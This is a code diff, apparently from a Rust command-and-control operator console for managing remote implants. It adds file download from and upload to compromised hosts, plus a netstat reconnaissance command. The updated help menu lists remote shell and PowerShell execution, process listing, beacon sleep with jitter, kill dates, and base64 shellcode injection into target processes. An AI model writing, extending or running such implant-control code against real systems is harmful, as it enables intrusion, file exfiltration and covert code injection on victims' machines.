@@ -251,6 +251,40 @@ fn interact(links: &Arc<Mutex<Links>>, link_id: Uuid, rl: &mut DefaultEditor) {
                             queue(links, link_id, line.clone(), line.clone());
                         }
                     }
+                    "netstat" => queue(links, link_id, "netstat".into(), line.clone()),
+
+                    // ── File operations ─────────────────────────────────
+                    "download" => {
+                        if args.is_empty() {
+                            ui::print("Usage: download <remote_path>");
+                        } else {
+                            let mut l = links.lock().unwrap();
+                            if let Some(id) = l.get_link(link_id).map(|link| link.id) {
+                                l.add_download_task(id, args.to_string());
+                                ui::print(&format!("{} Download task queued.", "[+]".green()));
+                            }
+                        }
+                    }
+                    "upload" => {
+                        let parts: Vec<&str> = args.split_whitespace().collect();
+                        if parts.len() < 2 {
+                            ui::print("Usage: upload <local_path> <remote_path>");
+                        } else {
+                            let local_path = parts[0].to_string();
+                            let remote_path = parts[1..].join(" ");
+                            let mut l = links.lock().unwrap();
+                            if let Some(id) = l.get_link(link_id).map(|link| link.id) {
+                                if l.add_upload_task(id, local_path, remote_path).is_some() {
+                                    ui::print(&format!("{} Upload task queued.", "[+]".green()));
+                                } else {
+                                    ui::print(&format!(
+                                        "{} Failed to read local file.",
+                                        "[-]".red()
+                                    ));
+                                }
+                            }
+                        }
+                    }
 
                     // ── Process injection ───────────────────────────────
                     "inject" => {
@@ -348,17 +382,30 @@ fn print_help() {
 }
 
 fn print_link_help() {
-    ui::print("  cmd <args>          Execute via cmd.exe /C <args>");
-    ui::print("  shell <cmd>         Send raw command string");
-    ui::print("  powershell <args>   Execute via powershell.exe");
-    ui::print("  ls [path]           List directory");
-    ui::print("  cd <path>           Change directory");
-    ui::print("  pwd                 Print working directory");
-    ui::print("  whoami              Current user (domain\\user)");
-    ui::print("  pid                 Process ID");
-    ui::print("  integrity           Token integrity level");
-    ui::print("  inject <pid> <b64>  Inject base64 shellcode into PID");
-    ui::print("  info                Show link metadata");
-    ui::print("  kill                Send exit + mark link dead");
-    ui::print("  back                Return to links menu");
+    ui::print("  ── Execution ────────────────────────────────────────");
+    ui::print("  shell <cmd>              Send raw command string");
+    ui::print("  cmd <args>               Execute via cmd.exe /C        (Windows only)");
+    ui::print("  powershell <args>        Execute via powershell.exe     (Windows only)");
+    ui::print("  ── Navigation ───────────────────────────────────────");
+    ui::print("  ls [path]                List directory");
+    ui::print("  cd <path>                Change directory");
+    ui::print("  pwd                      Print working directory");
+    ui::print("  whoami                   Current user");
+    ui::print("  pid                      Process ID");
+    ui::print("  ── Reconnaissance ───────────────────────────────────");
+    ui::print("  info                     Detailed system information");
+    ui::print("  ps                       List running processes");
+    ui::print("  netstat                  List network connections");
+    ui::print("  ── File transfer ────────────────────────────────────");
+    ui::print("  download <path>          Download file from implant");
+    ui::print("  upload <local> <remote>  Upload file to implant");
+    ui::print("  ── Operational ──────────────────────────────────────");
+    ui::print("  sleep <s> [jitter%]      Set polling interval (e.g. sleep 30 20)");
+    ui::print("  killdate <date|clear>    Set auto-exit date   (e.g. killdate 2026-12-31)");
+    ui::print("  ── Windows only ─────────────────────────────────────");
+    ui::print("  integrity                Token integrity level");
+    ui::print("  inject <pid> <b64>       Inject base64 shellcode into PID");
+    ui::print("  ── Session ──────────────────────────────────────────");
+    ui::print("  kill                     Send exit + mark link dead");
+    ui::print("  back                     Return to links menu");
 }
